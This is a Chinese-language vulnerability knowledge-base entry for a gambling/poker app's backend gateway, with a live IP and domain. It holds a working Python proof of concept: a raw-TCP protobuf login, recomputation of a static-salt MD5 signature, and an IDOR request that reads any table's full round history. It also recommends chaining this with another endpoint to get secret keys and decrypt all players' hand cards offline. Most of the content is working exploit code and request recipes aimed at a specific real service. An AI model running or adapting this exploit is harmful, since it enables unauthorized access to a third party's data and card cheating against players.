# 自研 App 网关 46750 POST /tableplayingrecord 缺失归属校验（按 tableid 读任意牌桌全量轮次历史）

- **code**: app-gateway-46750-tableplayingrecord-idor-tableid
- **kind**: exp
- **category**: unauthorized
- **component**: 自研 App 后端网关（IIS + JSON，POST 根路径，静态盐 private_&lt;route&gt; 签名）
- **versions**: 未标注版本（客户端 ver 1.0.0.9，接口 version 字段可填 0.0.0.0）
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: task#614，2026-11-04 18:39–18:41 UTC，Windows 执行机 python 3.13 + requests(trust_env=False) 直连 139.95.8.48:46750，请求间隔 6.2s，全程只读，共 12 发。① 36610：HEARTBEAT 0x1000 回 7B 时间戳原样回显；LOGIN 0x2001 certType=10 回 userId=485982/state=2，properties key=-99 取到 token——该账号为本次任务内自建、零牌局记录（账号/token/cert 已脱敏）。② 阳性对照 POST /notices（盐 private_notices）→ 200/439B/ret=0，证明该 token 被 46750 接受。③ POST /tableplayingrecord，tableid=1&roundid=1 → 200/8071B/ret=0，data.records 共 28 条，从 roundid"28" starttime=2023-10-26 14:57:43 倒序到 roundid"1" 14:47:42，含 ante/smallblind/bigblind/pools/collection，handcards 恒 [0,0]、win/wallet=0。④ 仅改 roundid=2 → 仍 200/8071B、sha16 同为 FD67BDCB5A695337，证明 roundid 被忽略、整桌一次全量下发。⑤ 换 tableid=2 → 200/32B {"ret":0,"data":{"freeshows":0}}（无 records 键），内容随 tableid 变化，构成桌级存在性 oracle；证伪条件（同 tableid 换桌后 records 不变）未出现。⑥ 归属证据：请求账号无任何牌局历史，而返回记录为 2023 年，且请求体无参与者/俱乐部约束（clubid=1/matchid=1 仍命中真实记录），服务端只绑定 token↔userid。同批阴性：/playingvcr 与 /webplayingvcr 签名与账号门已过但恒回 200/45B ret=4「获取牌局数据失败！」；/backgroundvcr 200/39B ret=1；/userinfo 自身与他人 uid 均 ret=3、账号名 targetid 走 502。
- **path**: pocs/app-gateway-46750-tableplayingrecord-idor-tableid/poc.py
- **tags**: 46750,tableplayingrecord,idor,越权,无归属校验,牌桌,轮次,牌谱,36610,protobuf,裸tcp,verify签名,静态盐,private_tableplayingrecord,存在性探测,playingvcr,webplayingvcr,userinfo,博彩
- **created_at**: 2026-11-04T18:46:17.888Z
- **engine**: https://139.95.8.48:46750（会话前置 sjan.o0hyfmi.club:36610）
- **found_by**: internal

## 描述

同族 App 网关的 /tableplayingrecord 只校验「body.token 与 body.userid 属于同一账号」，对 tableid 指向的牌桌不做任何参与者/俱乐部归属校验：任意持有在线 36610 会话的账号（含自建、零牌局记录的新账号）只要给出 tableid 就能拿到该桌**整桌全量**轮次历史（roundid 被服务端忽略）。返回的是桌级元数据（每轮 starttime/endtime/ante/smallblind/bigblind/pools/collection），非参与者视角 handcards 恒为 [0,0]、win/wallet 归零且无 userid/昵称，故本身是 medium；但它是同 tableid 空间上的「桌存在性 oracle」，可先探桌再配合 /notarialdata（条目 id 534）取 notarial+secretkey 离线还原整桌手牌，构成完整的牌局透视链。

## 用法

```
前置（缺一不可）：① 一个有效账号（自建、零牌局即可）；② 必须先登录 36610 裸 TCP 网关并**保持连接在线**（每 5–10s 发 0x1000 心跳），关掉 socket 后同一 token 立刻 ret=2；③ requests 必须 trust_env=False（本机代理会污染直连），IP 字面量主机需 --noproxy；④ 单发间隔 ≥6s。

三步：
1) 36610 登录：HEARTBEAT(0x1000, body=fv(1,ms_ts)) 回 7B 同体；LOGIN(0x2001) body = fv(1,2)+fv(2,10)+fs(3,CERT)+fs(4,CHANNEL)+fs(5,ACC)+fs(8,ACC)+fs(9,kv(0,"1.0.0.9"))+fs(9,kv(1,DEVICEID))+fs(9,kv(4,PKG))+fs(10,"%Y-%m-%d %H-%M-%S-0000_1")；16B 头全小端 = rsv u32|type u32|len i32|seq i32。应答 f2=userId、f3=state、f9 map 里 key=-99 即 token。
2) 签名离线复算（盐 private_tableplayingrecord，key 升序裸拼 key+value，无分隔符，MD5 大写）：
   signstr = clubid+v+gameid+v+matchid+v+matchtype+v+roundid+v+tableid+v+token+v+type+v+userid+v+version+v+"private_tableplayingrecord"
3) POST https://&lt;HOST&gt;:46750/tableplayingrecord，body：
   {"version":"0.0.0.0","token":"&lt;在线token&gt;","type":1,"userid":&lt;同名UID&gt;,
    "tableid":"1","roundid":"1","gameid":"1","matchid":"1","clubid":"1","matchtype":"1","verify":"&lt;复算值&gt;"}

判据（务必 A/B，别只看 200）：
- ret=0 + data.records 为 28 条数组（本项目实测 200/8071B，2023-10-26 14:57:43→14:47:42）→ 越权成立；
- 仅把 roundid 1→2 → 长度与 sha16 完全不变 → roundid 被忽略，整桌一次全量下发（倒序）；
- tableid 1→2 → 200/32B {"ret":0,"data":{"freeshows":0}}，**没有 records 键** → 空桌（注意这里不是 ret=3，判据是 records 在不在）；
- ret=2「账号认证失败！」→ token 与 userid 不同源，或 36610 socket 掉线；
- ret=1「参数检查失败！」→ verify 算错/字段缺失。

常见失败原因：把 gameid/matchid/matchtype 当定位键（实测全填 1 仍命中真实桌，定位键只有 tableid）；用 /notices 的盐 private_notices 或漏 clubid → ret=1；登录后关掉 TCP 再打 → ret=2；未关环境代理 → 连接被劫持/502。

阳性对照：同 token 打 POST /notices（盐 private_notices，字段 version/token/type/userid）→ ret=0 证明 token 被 46750 接受，再去打目标路由。
```

## 正文

```
# 46750 /tableplayingrecord 缺失归属校验（IDOR，桌级轮次历史）

## 1. 结论与危害

`POST https://<HOST>:46750/tableplayingrecord` 的访问控制只做到「`body.token` 与 `body.userid` 属于同一账号」，
**对 `tableid` 指向的牌桌没有任何参与者/俱乐部归属校验**。任何持有有效在线会话的账号——包括自建、零牌局记录的
测试账号——只要给出 `tableid` 就能取到该桌**整桌全量**轮次历史。

- 请求体里的 `clubid` / `matchid` / `matchtype` 全填 `1` 依然命中真实记录，说明这些字段只参与签名、不构成归属约束；
- `roundid` 被服务端**忽略**：`roundid=1` 与 `roundid=2` 回包逐字节相同（200/8071B，sha16 同为 `FD67BDCB5A695337`），
  整桌历史一次下发（倒序 28 轮）；
- 换 `tableid` 内容即变：`tableid=2` → `200/32B {"ret":0,"data":{"freeshows":0}}`，即按 id 取数的**桌级存在性 oracle**。

**危害边界（不要过度定级）**：非参与者视角下 `handcards` 恒为 `[0,0]`、`win`/`wallet` 归零、且不返回 `userid`/昵称，
所以本接口暴露的是**桌级轮次元数据**（时间、盲注、底池、抽水），不是逐玩家手牌与身份 → medium。
它的真正价值是与 `/notarialdata`（知识库条目 `app-gateway-46750-notarialdata-idor-tableid-roundid`，id 534）
共享同一 `tableid` 空间：先用本接口判定桌存在，再用同一 `tableid` 取 `notarial` + `secretkey` 离线还原整桌手牌。

## 2. 前置条件

1. 一个有效账号（自建、零牌局记录即可）。
2. **必须先登录 36610 裸 TCP 网关并保持连接在线**（每 5–10s 心跳）；socket 一断，同一 token 立刻 `ret=2`。
3. 签名可离线复算：盐是客户端字面量 `private_tableplayingrecord`，不依赖服务端密钥。
4. `token` 与 `userid` 必须同源。

## 3. 第一段：36610 登录取 token

帧格式（实测，全小端）：

```
16B 头 = rsv u32(0) | type u32 | len i32 | seq i32   + protobuf body
```

- `0x1000` HEARTBEAT：body = `field1 varint(毫秒时间戳)`；应答同 type、body 7B、时间戳原样回显 → 会话可用。
- `0x2001` LOGIN：body 字段

| field | 含义 | 实测值 |
|---|---|---|
| 1 | deviceType | 2 |
| 2 | certType | 10（凭证登录） |
| 3 | cert | `<CERT>` |
| 4 | channel | vip_1 |
| 5 / 8 | account | `<ACCOUNT>` |
| 9 (repeated) | properties map | {0:"1.0.0.9", 1:"<deviceid>", 4:"<package>"} |
| 10 | through | `%Y-%m-%d %H-%M-%S-0000_1` |

- 应答 `0x2001`：`f2=userId`、`f3=state`、`f9` 内 map `key=-99` 即 **token**。
- 拿到 token 后必须起心跳线程（约每 5–10s 发 `0x1000`），否则 HTTP 段会被判掉线。

（该网关登录链路的完整实现见 id 534 的脚本，本节只列复现所需最小信息。）

## 4. 第二段：签名复算

参与签名的 10 个字段：`clubid, gameid, matchid, matchtype, roundid, tableid, token, type, userid, version`。

```
signstr = "".join(k + str(v) for k in sorted(fields)) + "private_tableplayingrecord"
verify  = MD5(signstr).hexdigest().upper()      # 32 位大写
```

裸 key 拼裸 value：无 `=`、无 `&`、无分隔符。实测样例串（token 脱敏）：

```
clubid1gameid1matchid1matchtype1roundid1tableid1token<TOKEN>type1userid485982version0.0.0.0private_tableplayingrecord
```

`version` 可填 `0.0.0.0`（服务端只纳入签名、不校验版本）；填什么就必须按什么算。

## 5. 第三段：请求

```http
POST /tableplayingrecord HTTP/1.1
Host: <HOST>:46750
Content-Type: application/json;charset=utf-8

{"version":"0.0.0.0","token":"<在线会话token>","type":1,"userid":485982,
 "tableid":"1","roundid":"1","gameid":"1","matchid":"1","clubid":"1","matchtype":"1",
 "verify":"<复算值>"}
```

## 6. 判据（必须做 A/B，不能只看 200）

| 响应 | 含义 |
|---|---|
| `200 / 8071B` `{"ret":0,"data":{"records":[ ... 28 条 ... ]}}` | 越权读取成立：整桌全量轮次历史 |
| `200 / 32B` `{"ret":0,"data":{"freeshows":0}}` | 该 tableid 无记录（空桌）→ 桌级存在性探测；**判据是 `records` 键在不在，不是 ret 值** |
| `200 / 39B` `{"ret":2,"msg":"账号认证失败！"}` | token 与 userid 不同源，或 36610 socket 已掉线 |
| `200 / 39B` `{"ret":1,"msg":"参数检查失败！"}` | verify 算错 / 字段缺失（含漏 clubid） |

正向验证要点：

- `tableid=1&roundid=1` → 200/8071B/`ret=0`，`records` 28 条，`roundid` 从 `"28"`（`starttime=2023-10-26 14:57:43`）
  倒序到 `"1"`（`2023-10-26 14:47:42`，`pools="80000"`）；
- 仅把 `roundid` 改为 `2` → 长度仍是 8071B、sha16 仍是 `FD67BDCB5A695337` → roundid 被忽略、整桌一次全量；
- `tableid=2` → 200/32B `{"ret":0,"data":{"freeshows":0}}` → 内容随 tableid 变化，空桌；
- 同一 token 换 `body.userid` → `ret=2` → 门禁确实只绑 token↔userid，与牌局归属无关；
- **归属证据**：请求方是本次自建、零牌局记录的账号，而返回记录时间为 2023 年，且请求体没有任何参与者/俱乐部约束
  （`clubid`/`matchid` 均填 1 仍匹配真实记录）→ 「缺失归属校验」成立。

## 7. PoC（python，只读）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""46750 /tableplayingrecord 桌级越权读取 PoC（只读，需授权）
36610 裸 TCP protobuf 登录 -> 保持心跳 -> POST https://<API>:46750/tableplayingrecord
用法:
  export TCP_HOST=sjan.example.club TCP_PORT=36610 API=https://1.2.3.4:46750 \
         ACC=<账号> CERT=<certType=10 凭证>
  TIDS=1,2 RIDS=1,2 GAP=6.2 python tpr_idor.py
"""
import os, time, json, socket, struct, hashlib, threading
import requests, urllib3
urllib3.disable_warnings()

TCP_HOST = os.environ["TCP_HOST"]
TCP_PORT = int(os.environ.get("TCP_PORT", "36610"))
API      = os.environ["API"]
ACC      = os.environ["ACC"]
CERT     = os.environ["CERT"]          # certType=10 的凭证串
CHANNEL  = os.environ.get("CHANNEL", "vip_1")
DEVICEID = os.environ.get("DEVICEID", "")
PKG      = os.environ.get("PKG", "")
VERSION  = "0.0.0.0"
GAP      = float(os.environ.get("GAP", "6.2"))
TIDS     = [t for t in os.environ.get("TIDS", "1,2").split(",") if t]
RIDS     = [r for r in os.environ.get("RIDS", "1,2").split(",") if r]

S = requests.Session(); S.trust_env = False        # 关键：绕开本机代理
HDR = {"Content-Type": "application/json;charset=utf-8",
       "Accept": "application/json, text/plain, */*"}


def varint(n):
    if n < 0: n = (1 << 64) + n
    out = b""
    while True:
        b = n & 0x7F; n >>= 7
        if n: out += bytes([b | 0x80])
        else: return out + bytes([b])


def fv(num, v): return bytes([(num << 3) | 0]) + varint(v)


def fs(num, s):
    b = s.encode() if isinstance(s, str) else s
    return bytes([(num << 3) | 2]) + varint(len(b)) + b


def kv(k, v): return fv(1, k) + fs(3, v)


def parse_msg(b):
    out, i = [], 0
    while i < len(b):
        k = sh = 0
        while True:
            c = b[i]; i += 1; k |= (c & 0x7F) << sh; sh += 7
            if not (c & 0x80): break
        fn, wt = k >> 3, k & 7
        if wt == 0:
            v = sh = 0
            while True:
                c = b[i]; i += 1; v |= (c & 0x7F) << sh; sh += 7
                if not (c & 0x80): break
            if v >= (1 << 63): v -= (1 << 64)
            out.append({"f": fn, "wt": 0, "val": v})
        elif wt == 2:
            ln = sh = 0
            while True:
                c = b[i]; i += 1; ln |= (c & 0x7F) << sh; sh += 7
                if not (c & 0x80): break
            raw = b[i:i + ln]; i += ln
            try: s = raw.decode()
            except Exception: s = None
            out.append({"f": fn, "wt": 2, "hex": raw.hex(), "s": s})
        elif wt == 5: out.append({"f": fn, "wt": 5, "hex": b[i:i + 4].hex()}); i += 4
        elif wt == 1: out.append({"f": fn, "wt": 1, "hex": b[i:i + 8].hex()}); i += 8
        else: break
    return out


class Conn:
    def __init__(self):
        self.s = socket.create_connection((TCP_HOST, TCP_PORT), timeout=20)
        self.s.settimeout(20)
        self.lock = threading.Lock()

    def send(self, mtype, body):
        self.s.sendall(struct.pack("<I", 0) + struct.pack("<I", mtype) +
                       struct.pack("<i", len(body)) + struct.pack("<i", 1) + body)

    def recv(self):
        h = b""
        while len(h) < 16:
            c = self.s.recv(16 - len(h))
            if not c: raise EOFError("header eof")
            h += c
        _rsv, rt, bl, _sq = struct.unpack("<IIii", h)
        bd = b""
        while len(bd) < bl:
            c = self.s.recv(bl - len(bd))
            if not c: raise EOFError("body eof")
            bd += c
        return rt, bd


def login(conn):
    conn.send(0x1000, fv(1, int(time.time() * 1000)))
    rt, bd = conn.recv()
    assert rt == 0x1000 and len(bd) == 7, "heartbeat 不通"
    th = time.strftime("%Y-%m-%d %H-%M-%S") + "-0000_1"
    body = (fv(1, 2) + fv(2, 10) + fs(3, CERT) + fs(4, CHANNEL) +
            fs(5, ACC) + fs(8, ACC) +
            fs(9, kv(0, "1.0.0.9")) + fs(9, kv(1, DEVICEID)) + fs(9, kv(4, PKG)) +
            fs(10, th))
    conn.send(0x2001, body)
    rt, bd = conn.recv()
    uid = token = None
    for it in parse_msg(bd):
        if it["f"] == 2 and it["wt"] == 0:
            uid = it["val"]
        if it["f"] == 9 and it["wt"] == 2:
            d = {x["f"]: (x["val"] if x["wt"] == 0 else x.get("s"))
                 for x in parse_msg(bytes.fromhex(it["hex"]))}
            if d.get(1) == -99:
                token = d.get(3)
    assert token and uid, "登录失败（检查 ACC/CERT/certType=10）"
    return uid, token


def keepalive(conn, stop):
    while not stop.wait(5.0):
        try:
            with conn.lock:
                conn.send(0x1000, fv(1, int(time.time() * 1000)))
                conn.recv()
        except Exception as e:
            print("[-] 心跳断开:", e); return


def sign(d, salt):
    s = "".join("%s%s" % (k, d[k]) for k in sorted(d)) + salt
    return hashlib.md5(s.encode()).hexdigest().upper()


def post(route, salt, fields):
    body = dict(fields); body["verify"] = sign(fields, salt)
    r = S.post(API + route, json=body, headers=HDR, timeout=45, verify=False)
    time.sleep(GAP)
    try: j = r.json()
    except Exception: j = None
    print("[%s] sha16=%s len=%d ret=%r" % (route, hashlib.sha256(r.content).hexdigest()[:16].upper(),
                                           len(r.content), (j or {}).get("ret")))
    return r, j


def tpr(token, uid, tid, rid, clubid="1", gameid="1", matchid="1", matchtype="1"):
    return post("/tableplayingrecord", "private_tableplayingrecord", {
        "version": VERSION, "token": token, "type": 1, "userid": uid,
        "tableid": str(tid), "roundid": str(rid),
        "gameid": gameid, "matchid": matchid, "clubid": clubid, "matchtype": matchtype})


def main():
    conn = Conn()
    uid, token = login(conn)
    stop = threading.Event()
    threading.Thread(target=keepalive, args=(conn, stop), daemon=True).start()
    print("[+] uid=%s token=%s..." % (uid, token[:8]))

    # 阳性对照：证明该 token 被 46750 接受（盐 private_notices）
    _r, j = post("/notices", "private_notices",
                 {"version": "1.0.0.9", "token": token, "type": 1, "userid": uid})
    if (j or {}).get("ret") != 0:
        print("[!] 阳性对照失败：token 未被接受或会话已掉线")

    for tid in TIDS:
        for rid in RIDS:
            _r, j = tpr(token, uid, tid, rid)
            data = (j or {}).get("data") or {}
            recs = data.get("records") or []
            if recs:
                print("    [+] tableid=%s roundid=%s 命中 %d 轮，首=%s 末=%s"
                      % (tid, rid, len(recs), recs[0].get("starttime"), recs[-1].get("starttime")))
            else:
                print("    [-] tableid=%s roundid=%s 空桌/无记录 data=%s"
                      % (tid, rid, json.dumps(data, ensure_ascii=False)[:120]))
    stop.set(); conn.s.close()


if __name__ == "__main__":
    main()
```

## 8. 与 /notarialdata 的组合链（推荐打法）

两者共享同一个 `tableid` 自增空间、同一套 `token↔userid` 门禁、同一 36610 会话保活：

1. 本接口按 `tableid` 递增探测，`data.records` 非空即「该桌存在且打过牌」，同时拿到该桌的轮次区间
   （第一轮的 `endtime`/时间窗，可直接喂给 VCR 类接口）；
2. 用同一 `tableid` + 探测到的 `roundid` 去打 `/notarialdata`（盐 `private_notarialdata`），取 `notarial`+`secretkey`；
3. 客户端 `decryptCards` 离线还原该局手牌 → 牌局透视。

条目：`app-gateway-46750-notarialdata-idor-tableid-roundid`（id 534）。

## 9. 同批阴性（同一 token / 同一会话，均已证否，别再重复走）

| 路由 | 盐 | 实测结果 | 结论 |
|---|---|---|---|
| `/playingvcr` | `private_playingvcr` | `200/45B {"ret":4,"msg":"获取牌局数据失败！"}`（`showseats=511` 与给足 `endtime=2023-10-26 14:47:59` 均同） | 已越过签名/账号门，但服务端恒回 ret=4，未返回任何 VCR；本会话下不可用 |
| `/webplayingvcr` | `private_webplayingvcr` | `200/45B` 同型 `ret=4`（`referencetime` 给足仍同） | 同上 |
| `/backgroundvcr` | `20230713134001_pri_backstageopenfrom` | `200/39B {"ret":1,"msg":"参数检查失败！"}` | 参数面未打通，未取得数据 |
| `/userinfo` | `private_userinfo` | `accounttype=1&targetid=自身/他人` 均 `200/9B {"ret":3}`；`accounttype=0&targetid=<账号名>` → `502 IIS` | 跨账号读取阴性，未见返回资料 |

注意：`/playingvcr`、`/webplayingvcr` 的 `ret=4` 是**业务层**拒绝，不是签名错误（签名正确、账号门已过），
说明这些路由还要求额外的参与者/录像归属上下文，暂未找到可用参数组合。

## 10. 常见失败原因

- 把 `gameid`/`matchid`/`matchtype` 当成定位键：实测固定为 `1` 时只改 `tableid` 返回即变化，定位键只有 `tableid`；
- 签名漏掉 `clubid`（本接口比 `/notarialdata` 多一个 `clubid` 字段）→ `ret=1`；
- 用了 `/notices` 的盐 `private_notices` → `ret=1`；
- 登录后关掉 TCP 再打 → `ret=2`，必须靠心跳续会话；
- `requests` 未设 `trust_env=False`（或命令行未 `--noproxy '*'`）→ 被本机代理劫持/502。

## 11. 证伪条件

- 若 `tableid=2` 返回与 `tableid=1` 相同的 28 条 `records`，或换 `tableid` 后回包逐字节不变 → 「缺失归属校验」不成立；
  本轮 `tableid=2` 返回 32B 空数据（`{"freeshows":0}`），故成立；
- 若换 `roundid` 后回包内容跟着变 → 说明是逐局接口而非整桌全量，本条「roundid 被忽略」的表述需修正
  （本轮两发 sha16 完全相同）；
- 若用随机 token 也能 `ret=0` → 不只是 IDOR，而是完全未授权，需重新定级；
- 若返回体里出现 `userid`/昵称/非零 `handcards` → 危害升级，应按「手牌泄露」重新定级。

```
